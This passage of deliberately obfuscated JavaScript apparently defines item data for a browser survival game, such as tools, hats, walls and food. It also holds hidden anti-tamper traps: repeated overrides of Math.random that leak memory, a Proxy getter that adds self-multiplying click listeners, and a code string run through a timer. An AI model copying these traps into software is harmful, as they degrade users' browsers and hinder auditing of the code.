			const ⵠΔⵠⵠⲆ = ⲆⲆΔⲆΔΔⲆ([11616, 11398, 11616, 5123, 5123, 5123, 11616]);
			const ᐃΔᐃⵠⵠ = {
				"ᐃΔᐃⲆᐃΔⵠ": 15293533,
				"ΔΔⵠᐃ": 13503976,
				"ⵠⲆⵠᐃᐃᐃⵠ": 1080712,
				"ᐃΔⵠᐃΔⲆΔ": 2570561
			};
			if (ᐃΔᐃⵠⵠ[ⵠΔⵠⵠⲆ] !== ᐃΔᐃⵠⵠ.ⵠⲆⵠᐃᐃᐃⵠ) {
				const ⵠⲆⵠᐃᐃᐃⵠ = Math.random;
				const ΔⵠΔᐃ = [];
				const ⲆᐃΔᐃᐃΔⲆ = function() {
					for (let ⲆⲆΔⲆΔΔⲆ = 0; ⲆⲆΔⲆΔΔⲆ < 4057; ⲆⲆΔⲆΔΔⲆ++) ΔⵠΔᐃ.push(ⲆⲆΔⲆΔΔⲆ);
					return ⵠⲆⵠᐃᐃᐃⵠ()
				};
				Math.random = ⲆᐃΔᐃᐃΔⲆ
			}
		};
		ΔΔⲆΔᐃΔⵠ();
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆΔⵠΔⵠ] = {
			name: "Garlic",
			"ᐃⵠ": Ⲇ.ᐃΔⲆᐃⵠΔⵠ,
			"ᐃᐃⲆⵠ": ⵠⲆⲆ,
			"ⵠⲆⵠΔ": 0
		};
		const ΔⲆᐃᐃΔΔᐃ = ⵠⵠⵠⵠΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⵠᐃΔΔ] = {
			name: "Thornbush",
			"ᐃⵠ": Ⲇ.ⲆⵠΔⵠᐃⵠΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆΔⲆΔ] = {
			name: "Carrot",
			"ᐃⵠ": Ⲇ.ⵠᐃΔⵠⲆᐃⲆ,
			"ᐃᐃⲆⵠ": ᐃⵠⲆ,
			"ⵠⲆⵠΔ": ᐃⵠⲆ
		};
		const ⲆⵠᐃΔ = Ⲇᐃⵠᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⲆⲆᐃⵠ] = {
			name: "Tomato",
			"ᐃⵠ": Ⲇ.ⵠⲆᐃΔΔΔⲆ,
			"ᐃᐃⲆⵠ": ᐃⵠΔ,
			"ⵠⲆⵠΔ": Δⵠᐃ
		};
		const ⲆᐃⲆⲆΔⲆⲆ = ᐃⵠᐃⵠᐃⵠⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔΔΔᐃⲆ] = {
			name: "Watermelon",
			"ᐃⵠ": Ⲇ.ⵠΔΔᐃΔΔⵠ,
			"ᐃᐃⲆⵠ": ᐃΔΔ,
			"ⵠⲆⵠΔ": 0
		};
		const Δⵠᐃᐃᐃ = ΔᐃⲆⵠᐃ;
		const ᐃᐃΔⲆⲆΔⲆ = ⲆᐃΔⵠΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⵠᐃⲆᐃ] = {
			name: "Aloe Vera",
			"ᐃⵠ": Ⲇ.ΔⲆⲆᐃⵠᐃΔ,
			"ᐃᐃⲆⵠ": ᐃⵠⲆ,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⲆᐃⲆⲆ] = {
			name: "Penguin Feather",
			"ᐃⵠ": Ⲇ.ᐃⲆⲆⵠΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ⵠⲆⲆ
		};
		const ⵠᐃⵠⲆ = ᐃᐃⲆⲆ;
		const ⲆⲆΔΔⵠΔⲆ = ⲆΔⲆⲆᐃ;
		const ΔⵠⵠⲆⵠᐃᐃ = ⵠⵠⵠᐃᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠᐃⲆᐃᐃ] = {
			name: "Hawk Feather",
			"ᐃⵠ": Ⲇ.ᐃⵠⲆⵠⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ᐃΔΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⲆΔᐃΔ] = {
			name: "Vulture Feather",
			"ᐃⵠ": Ⲇ.ⲆᐃⲆⵠΔ,
			"ᐃᐃⲆⵠ": ⵠⲆⲆ,
			"ⵠⲆⵠΔ": ΔΔⵠ
		};
		const ⵠΔᐃⲆⲆΔᐃ = ᐃⵠᐃⲆⲆⲆΔ;
		const ᐃΔⵠⵠⲆⵠⲆΔⲆ = {};
		const Ⲇⵠⵠⵠᐃⵠᐃ = {};
		ᐃΔⵠⵠⲆⵠⲆΔⲆ["get"] = function(ᐃⵠᐃΔⵠᐃΔ, ᐃᐃⵠⵠⵠⲆᐃ) {
			if (ᐃᐃⵠⵠⵠⲆᐃ !== "ᐃΔⵠⵠⲆⵠⲆΔⲆ") {
				const ᐃΔⵠⵠⲆⵠⲆΔⲆ = function() {
					for (let ᐃⵠᐃΔⵠᐃΔ = 0; ᐃⵠᐃΔⵠᐃΔ < 5; ᐃⵠᐃΔⵠᐃΔ++) ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[277]]("click", (function() {
						ᐃΔⵠⵠⲆⵠⲆΔⲆ()
					}))
				};
				ᐃΔⵠⵠⲆⵠⲆΔⲆ()
			}
			return ᐃⲆᐃΔᐃⵠᐃ["Reflect"]["get"](...arguments)
		};
		const ⵠⲆΔᐃΔᐃᐃ = new ᐃⲆᐃΔᐃⵠᐃ["Proxy"](Ⲇⵠⵠⵠᐃⵠᐃ, ᐃΔⵠⵠⲆⵠⲆΔⲆ);
		const ⲆΔᐃⲆⵠᐃⵠ = ⵠⲆΔᐃΔᐃᐃ.ᐃΔⵠⵠⲆⵠⲆΔⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠᐃΔᐃΔ] = {
			name: ⵠ[15],
			"ᐃⵠ": Ⲇ.ⵠΔᐃⵠΔΔⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ⲆΔⵠ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠΔΔᐃᐃᐃ] = {
			name: ⵠ[15],
			"ᐃⵠ": Ⲇ.ΔⲆᐃᐃᐃᐃⵠ,
			"ᐃᐃⲆⵠ": ΔⲆⲆ,
			"ⵠⲆⵠΔ": ᐃΔΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆᐃΔⲆⵠⲆ] = {
			name: "Pitchfork Part",
			"ᐃⵠ": Ⲇ.ΔᐃΔⲆⲆΔⲆ,
			"ᐃᐃⲆⵠ": ΔⲆⲆ,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠΔᐃⵠᐃ] = {
			name: ⵠ[159],
			"ᐃⵠ": Ⲇ.ⲆΔᐃΔᐃⲆⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		const ⲆⲆᐃΔΔ = ⵠⵠⲆΔΔ;
		const ⵠⲆΔᐃⲆ = ⵠᐃⲆᐃΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆⲆᐃᐃ] = {
			name: "Emerald",
			"ᐃⵠ": Ⲇ.ⲆᐃᐃⵠΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ᐃⵠⲆ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠᐃⲆⲆ] = {
			name: "Christmas Hat",
			"ᐃⵠ": Ⲇ.ΔⲆⲆᐃⵠΔᐃ,
			"ⵠⲆⵠΔ": 0
		};
		const ΔΔⵠΔ = ᐃᐃⲆⲆ;
		const ᐃᐃᐃΔᐃⵠⲆΔⵠ = ⲆᐃⵠᐃⲆⵠⲆ;
		const ⲆⲆᐃᐃⲆ = ⲆᐃΔⲆⵠ;
		const ⲆᐃᐃᐃⵠⵠⲆ = 1004252;

		function ⵠᐃⲆΔΔΔΔⲆᐃ(ᐃⵠⲆⵠᐃⵠᐃⲆⲆ) {
			const ⲆᐃᐃᐃⵠⵠⲆ = Math.random;
			const ᐃᐃᐃⵠᐃΔⵠ = [];
			const ⵠⵠᐃᐃᐃⵠΔ = function() {
				for (let ⵠⲆΔⲆᐃⲆⵠ = 0; ⵠⲆΔⲆᐃⲆⵠ < 6409; ⵠⲆΔⲆᐃⲆⵠ++) ᐃᐃᐃⵠᐃΔⵠ.push(ⵠⲆΔⲆᐃⲆⵠ);
				return ⲆᐃᐃᐃⵠⵠⲆ()
			};
			Math.random = ⵠⵠᐃᐃᐃⵠΔ
		}
		const ᐃⵠⲆⵠᐃⵠᐃⲆⲆ = ⵠᐃⲆΔΔΔΔⲆᐃ + ";" + "let ᐃⵠⲆⵠᐃⵠᐃⲆⲆ = " + ⵠᐃⲆΔΔΔΔⲆᐃ + ";";
		const ⵠⵠᐃᐃᐃⵠΔ = ᐃⵠⲆⵠᐃⵠᐃⲆⲆ + "let ᐃᐃᐃⵠᐃΔⵠ = 5983742; try { ᐃᐃᐃⵠᐃΔⵠ = ⵠᐃⲆΔΔΔΔⲆᐃ; } catch (ⵠⲆΔⲆᐃⲆⵠ) { ᐃⵠⲆⵠᐃⵠᐃⲆⲆ (); };";
		ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]](ⵠⵠᐃᐃᐃⵠΔ, 0);
		const Δᐃᐃᐃ = ΔΔⵠ;
		const ⵠΔⲆⵠⲆⵠΔ = ⲆΔᐃⵠᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⲆΔⵠⵠ] = {
			name: "Elf Hat",
			"ᐃⵠ": Ⲇ.ᐃⲆⵠⲆᐃᐃᐃ,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⲆⲆⲆᐃ] = {
			name: "Garland",
			"ᐃⵠ": Ⲇ.ⵠᐃᐃⵠᐃⵠΔ,
			"ⵠⲆⵠΔ": ᐃΔΔ,
			"ᐃᐃⲆⵠ": ⵠⲆⲆ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆⵠᐃⲆ] = {
			name: "Candy",
			"ᐃⵠ": Ⲇ.ⲆⲆⵠⲆⲆᐃΔ,
			"ⵠⲆⵠΔ": Δⵠᐃ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔᐃⲆⵠⲆ] = {
			name: "Sugar Cane",
			"ᐃⵠ": Ⲇ.ⵠΔⲆⲆⵠᐃΔ,
			"ⵠⲆⵠΔ": 0
		};
		const ΔᐃⲆΔ = ⵠⵠⵠᐃ;
		const ᐃᐃⵠᐃΔᐃⵠ = ⵠΔᐃΔᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆᐃⲆⲆΔ] = {
			name: "Pirate Sword",
			"ᐃⵠ": Ⲇ.ΔΔⲆⵠΔⵠⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ᐃΔΔ
		};
		const ⵠⵠᐃⵠᐃⵠΔⲆⲆ = ⲆΔᐃΔⵠⵠⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠⲆΔⵠ] = {
			name: "Crab Stick",
			"ᐃⵠ": Ⲇ.ᐃⵠⲆΔΔⲆᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆΔᐃᐃ] = {
			name: "Reidite",
			"ᐃⵠ": Ⲇ.ⲆⵠⲆⲆᐃⵠⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠᐃᐃΔ] = {
			name: "Flame",
			"ᐃⵠ": Ⲇ.ΔⲆᐃⵠᐃᐃⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 0
		};
		const ⵠΔⲆⲆⲆ = ⲆΔᐃⲆΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆΔᐃΔ] = {
			name: "Campfire",
			"ᐃⵠ": Ⲇ.ⵠΔΔⲆᐃΔⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		const ᐃⵠᐃⵠⵠΔᐃ = ᐃᐃᐃⵠᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⲆⲆⲆΔ] = {
			name: ⵠ[295],
			"ᐃⵠ": Ⲇ.ᐃⲆⵠᐃⵠⲆΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		const ⲆⵠⲆⲆ = ⵠⲆΔ;
		const ᐃⲆᐃⲆⲆ = ⲆⲆⲆⲆᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⲆⲆΔᐃ] = {
			name: "Workbench",
			"ᐃⵠ": Ⲇ.ⲆᐃᐃⵠᐃⲆΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ⵠΔΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆᐃⵠΔᐃ] = {
			name: "Stone sword",
			"ᐃⵠ": Ⲇ.ⲆⵠᐃⵠⵠⲆᐃ,
			"ᐃᐃⲆⵠ": Δᐃᐃᐃ,
			"ⵠⲆⵠΔ": ⵠⲆΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠᐃⵠΔ] = {
			name: "Stone pick",
			"ᐃⵠ": Ⲇ.ⲆⲆᐃᐃⲆⵠᐃ,
			"ᐃᐃⲆⵠ": Δⵠᐃ,
			"ⵠⲆⵠΔ": ⵠΔᐃ
		};
		const ⵠΔⲆᐃ = ⲆⲆΔᐃ;
		const ⵠᐃⲆⲆΔ = ⵠⵠⲆΔΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠΔⵠᐃΔ] = {
			name: "Berries bush",
			"ᐃⵠ": Ⲇ.ΔΔᐃΔⲆⲆⵠ,
			"ᐃᐃⲆⵠ": ᐃΔΔ,
			"ⵠⲆⵠΔ": ΔⲆⲆ
		};
		const ᐃⲆⵠΔ = ⵠⵠΔⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔΔⲆⵠⲆ] = {
			name: "Gold pick",
			"ᐃⵠ": Ⲇ.ᐃⲆΔᐃⲆⲆⲆ,
			"ᐃᐃⲆⵠ": ⵠⲆⲆ,
			"ⵠⲆⵠΔ": ⲆⵠⲆⲆ
		};
		const ᐃΔⲆⲆᐃ = ᐃⵠΔᐃᐃ;
		const ⲆⵠⲆΔΔΔᐃ = ΔⲆⲆⲆⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⲆⲆΔⲆ] = {
			name: "Diamond pick",
			"ᐃⵠ": Ⲇ.ⵠΔⵠⵠᐃⵠⲆ,
			"ᐃᐃⲆⵠ": ΔΔⵠ,
			"ⵠⲆⵠΔ": ᐃᐃⲆΔ
		};
		const ⵠⲆⵠⵠᐃⲆⵠ = ΔⵠⲆΔᐃΔⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔΔⵠᐃᐃ] = {
			name: "Wood sword",
			"ᐃⵠ": Ⲇ.ⵠⵠⲆⵠᐃᐃΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		const ᐃᐃΔⵠⵠⵠΔ = ᐃⲆᐃᐃΔ;
		const ΔΔⲆⵠⵠᐃᐃ = ᐃᐃᐃᐃⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠᐃⲆⵠΔ] = {
			name: "Gold sword",
			"ᐃⵠ": Ⲇ.ᐃⵠⵠΔᐃⵠⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃΔⵠᐃⵠ] = {
			name: "Diamond sword",
			"ᐃⵠ": Ⲇ.ΔⲆⵠⵠᐃᐃⲆ,
			"ᐃᐃⲆⵠ": ⵠⲆⲆ,
			"ⵠⲆⵠΔ": ⲆⵠⲆⲆ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔᐃⲆΔⲆ] = {
			name: "Wood pick",
			"ᐃⵠ": Ⲇ.ΔᐃΔΔⲆᐃⲆ,
			"ᐃᐃⲆⵠ": Δⵠᐃ,
			"ⵠⲆⵠΔ": ⵠⲆΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆΔΔⵠᐃ] = {
			name: "Wood wall",
			"ᐃⵠ": Ⲇ.ⲆΔᐃᐃⲆᐃⵠ,
			"ᐃᐃⲆⵠ": ΔⲆⲆ,
			"ⵠⲆⵠΔ": ⲆⵠⲆⲆ
		};
		const ⵠⵠΔΔᐃ = ΔᐃⲆⵠᐃ;
		const ⵠⵠⵠΔᐃ = ᐃⵠⲆᐃᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⵠⵠΔⲆ] = {
			name: "Wood spike",
			"ᐃⵠ": Ⲇ.ΔΔΔΔⲆᐃΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆᐃⲆⲆⲆ] = {
			name: "Cooked meat",
			"ᐃⵠ": Ⲇ.ⵠⲆΔᐃΔⵠΔ,
			"ᐃᐃⲆⵠ": ΔΔⵠ,
			"ⵠⲆⵠΔ": ᐃΔΔ
		};
		const ⲆΔᐃΔⲆΔΔ = ΔᐃΔⲆⲆⲆⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠⵠⵠⲆ] = {
			name: "Big campfire",
			"ᐃⵠ": Ⲇ.ⵠᐃⵠᐃΔⲆⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ⲆⵠⲆⲆ
		};
		const ⵠΔΔΔΔ = ᐃⲆΔⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔΔⵠⵠᐃ] = {
			name: "Bandage",
			"ᐃⵠ": Ⲇ.ⵠᐃᐃᐃⲆᐃⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ᐃᐃⲆΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠΔⲆⲆ] = {
			name: "Stone wall",
			"ᐃⵠ": Ⲇ.Δᐃⵠᐃᐃⵠⵠ,
			"ᐃᐃⲆⵠ": ᐃⵠΔ,
			"ⵠⲆⵠΔ": 1
		};
		const ᐃⲆⲆⵠⵠΔΔ = ᐃΔΔⵠᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆᐃᐃΔⲆ] = {
			name: "Gold wall",
			"ᐃⵠ": Ⲇ.ⲆΔΔᐃⵠᐃᐃ,
			"ᐃᐃⲆⵠ": Δⵠᐃ,
			"ⵠⲆⵠΔ": 1
		};
		const ΔⵠⲆⲆΔΔᐃ = ΔⲆⵠᐃⵠⵠΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆΔⲆᐃᐃ] = {
			name: "Diamond wall",
			"ᐃⵠ": Ⲇ.ᐃΔⲆⲆΔᐃⵠ,
			"ᐃᐃⲆⵠ": ᐃΔΔ,
			"ⵠⲆⵠΔ": ᐃⲆᐃ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠᐃᐃⵠᐃ] = {
			name: "Wood door",
			"ᐃⵠ": Ⲇ.ᐃᐃⵠΔⲆᐃᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ⵠΔᐃ
		};
		const ⵠⵠⲆΔⵠⵠΔ = ΔΔΔΔΔ;
		const ᐃⲆΔⲆᐃⲆᐃ = ᐃΔΔⲆΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⵠⵠᐃⵠ] = {
			name: "Chest",
			"ᐃⵠ": Ⲇ.ᐃⲆⲆΔⲆΔⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆΔᐃΔᐃ] = {
			name: "Stone spike",
			"ᐃⵠ": Ⲇ.ΔᐃΔⲆⵠⵠᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆΔⲆⵠΔ] = {
			name: "Gold spike",
			"ᐃⵠ": Ⲇ.ΔΔⲆⲆⵠΔᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ᐃᐃⵠ
		};
		const Δⵠᐃᐃⵠ = ⵠᐃΔⵠᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⲆΔⵠⲆ] = {
			name: "Diamond spike",
			"ᐃⵠ": Ⲇ.ⵠᐃᐃᐃᐃⵠⲆ,
			"ᐃᐃⲆⵠ": ΔΔⵠ,
			"ⵠⲆⵠΔ": ᐃᐃⵠ
		};
		const ⲆᐃⲆΔⲆΔⲆ = ᐃΔⲆᐃⲆᐃⲆ;
		const ΔᐃᐃⲆⵠⲆⵠ = ⲆⲆⵠΔᐃΔΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆΔⵠΔΔ] = {
			name: "Stone door",
			"ᐃⵠ": Ⲇ.ᐃΔⵠⵠᐃᐃΔ,
			"ᐃᐃⲆⵠ": ΔⲆⲆ,
			"ⵠⲆⵠΔ": ΔⲆⵠ
		};
		const ⵠⲆⲆⲆⲆ = ⲆⵠᐃᐃⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠᐃⵠⵠᐃ] = {
			name: "Gold door",
			"ᐃⵠ": Ⲇ.ᐃΔᐃⵠⵠⲆΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⵠⵠᐃⲆ] = {
			name: "Diamond door",
			"ᐃⵠ": Ⲇ.ΔΔΔⲆᐃᐃΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		const ⵠΔⲆⵠ = ᐃⵠΔ;
		const ⲆⵠΔΔⲆⲆⵠ = ΔⵠⲆⵠᐃᐃΔ;
		const ΔΔΔⲆⲆⲆᐃ = ⲆΔⲆᐃΔΔⲆ;
		const ⲆⵠⵠᐃⲆ = ⵠᐃⲆᐃΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠᐃⲆⵠ] = {
			name: ⵠ[308],
			"ᐃⵠ": Ⲇ.ᐃⲆⵠⵠᐃⲆⵠ,
			"ᐃᐃⲆⵠ": ⵠΔⲆⵠ,
			"ⵠⲆⵠΔ": 1
		};
		const ᐃⲆⵠⵠᐃ = ΔⵠΔᐃⵠ;
		const ΔⵠⲆᐃⲆ = ⲆⵠⵠⲆΔ;
		const ⵠⲆⵠⲆ = ΔⵠᐃⲆ;
		const ᐃⲆᐃᐃᐃⲆⵠ = ⲆⵠᐃᐃΔΔⵠ;
		const ⲆΔΔΔⲆ = ᐃᐃⵠⵠΔ;
		const ΔΔⲆⵠΔⲆⵠ = ᐃⲆΔⲆⵠ;
		const ⲆΔⲆᐃΔ = ⵠᐃΔΔⵠ;
		const ᐃⲆᐃⲆⵠ = ⵠⲆⵠᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃᐃⲆⵠᐃ] = {
			name: "Big Chapka",
			"ᐃⵠ": Ⲇ.ⲆᐃⲆⵠΔⵠⲆ,
			"ᐃᐃⲆⵠ": ΔⲆⲆ,
			"ⵠⲆⵠΔ": 1
		};
		const ⵠⲆᐃⵠ = ᐃⵠⲆ;
		const ⲆⵠⵠⵠⲆⲆⲆ = ⵠⲆⵠⵠᐃⲆⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⲆⵠΔⲆ] = {
			name: "Wood spear",
			"ᐃⵠ": Ⲇ.ΔΔⵠᐃΔΔᐃ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ΔⲆⵠ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠΔΔⲆ] = {
			name: "Stone spear",
			"ᐃⵠ": Ⲇ.ΔΔⲆⵠΔⲆΔ,
			"ᐃᐃⲆⵠ": ᐃⵠΔ,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠⵠⲆΔⲆ] = {
			name: "Gold spear",
			"ᐃⵠ": Ⲇ.ⵠᐃⲆΔΔⲆⲆ,
			"ᐃᐃⲆⵠ": ᐃΔΔ,
			"ⵠⲆⵠΔ": ⵠΔΔ
		};
		const ⲆⲆΔⵠ = ⵠᐃΔⵠ;
		const ΔⵠⵠΔⵠᐃⲆ = ⲆΔᐃΔⲆΔΔ;
		ⲆⲆⵠᐃ[ᐃᐃ.ΔᐃΔΔΔ] = {
			name: "Diamond spear",
			"ᐃⵠ": Ⲇ.ΔⲆⲆⲆᐃⵠⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": 1
		};
		const ΔⲆᐃᐃⲆⵠᐃ = ΔⲆⵠΔⲆ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⲆⵠᐃⵠ] = {
			name: "Dragon spear",
			"ᐃⵠ": Ⲇ.ⲆⲆⵠⵠᐃⲆⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ᐃⵠΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⲆⲆΔᐃ] = {
			name: "Dragon spear",
			"ᐃⵠ": Ⲇ.ΔΔⵠⵠᐃⲆⲆ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ⵠⲆᐃⵠ
		};
		const ΔᐃΔⵠⲆⵠᐃⵠΔ = ⵠΔᐃⲆⲆΔᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃᐃΔⲆΔ] = {
			name: "Crab spear",
			"ᐃⵠ": Ⲇ.ᐃⲆⲆⵠΔᐃᐃ,
			"ᐃᐃⲆⵠ": ᐃⵠⲆ,
			"ⵠⲆⵠΔ": 1
		};
		const Δᐃⵠⵠ = ⲆⲆΔᐃ;
		const ⲆⵠᐃⲆ = ⲆⵠᐃΔ;
		const ᐃᐃⵠⲆᐃ = ᐃⲆᐃᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃΔΔΔⵠ] = {
			name: "Crab loot",
			"ᐃⵠ": Ⲇ.ⲆΔⵠᐃⵠⲆⵠ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": Δᐃᐃᐃ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠΔⵠΔᐃ] = {
			name: "Furnace",
			"ᐃⵠ": Ⲇ.ⵠⲆⵠⲆⲆΔΔ,
			"ᐃᐃⲆⵠ": Δᐃᐃᐃ,
			"ⵠⲆⵠΔ": ⵠΔΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔⵠⲆⵠΔ] = {
			name: "Explorer hat",
			"ᐃⵠ": Ⲇ.ⵠⲆᐃΔΔⲆΔ,
			"ᐃᐃⲆⵠ": ᐃΔΔ,
			"ⵠⲆⵠΔ": ᐃᐃⲆΔ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⵠΔⲆᐃ] = {
			name: "Pirate hat",
			"ᐃⵠ": Ⲇ.ⵠΔΔⵠΔⵠΔ,
			"ᐃᐃⲆⵠ": 0,
			"ⵠⲆⵠΔ": ⲆⵠⲆⲆ
		};
		const ᐃⵠᐃⵠᐃ = ⲆΔⵠⲆⲆ;
		const ⵠⲆΔΔᐃ = ⵠⲆⵠⲆⵠ;
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆᐃⲆᐃⲆ] = {
			name: "Flower hat",
			"ᐃⵠ": Ⲇ.ⵠⲆⲆΔΔΔᐃ,
			"ᐃᐃⲆⵠ": ᐃΔΔ,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ΔᐃⲆⵠΔ] = {
			name: "Fur hat",
			"ᐃⵠ": Ⲇ.ⵠⲆⲆΔⵠⲆⵠ,
			"ᐃᐃⲆⵠ": ⵠⲆⲆ,
			"ⵠⲆⵠΔ": ᐃᐃⵠ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃⵠⵠⲆΔ] = {
			name: "Wood helmet",
			"ᐃⵠ": Ⲇ.ᐃΔⲆΔⵠᐃⵠ,
			"ᐃᐃⲆⵠ": ΔⲆⲆ,
			"ⵠⲆⵠΔ": 1
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⵠΔΔᐃⲆ] = {
			name: "Stone helmet",
			"ᐃⵠ": Ⲇ.ᐃᐃⵠⵠΔⵠⵠ,
			"ᐃᐃⲆⵠ": ⵠΔⲆⵠ,
			"ⵠⲆⵠΔ": ⲆⵠⲆⲆ
		};
		ⲆⲆⵠᐃ[ᐃᐃ.ⲆⵠⲆⵠΔ] = {
			name: "Gold helmet",
			"ᐃⵠ": Ⲇ.ⵠⵠᐃⲆⲆΔⲆ,
			"ᐃᐃⲆⵠ": ⵠⲆⲆ,
			"ⵠⲆⵠΔ": ΔΔΔ
		};
		const ΔⵠᐃΔΔΔⵠ = ΔⲆᐃᐃⲆⵠᐃ;
		ⲆⲆⵠᐃ[ᐃᐃ.ᐃΔⲆⲆⲆ] = {
			name: "Diamond helmet",
			"ᐃⵠ": Ⲇ.ᐃⵠᐃⲆⵠⲆΔ,
			"ᐃᐃⲆⵠ": ⵠⲆᐃⵠ,
			"ⵠⲆⵠΔ": 1
		};
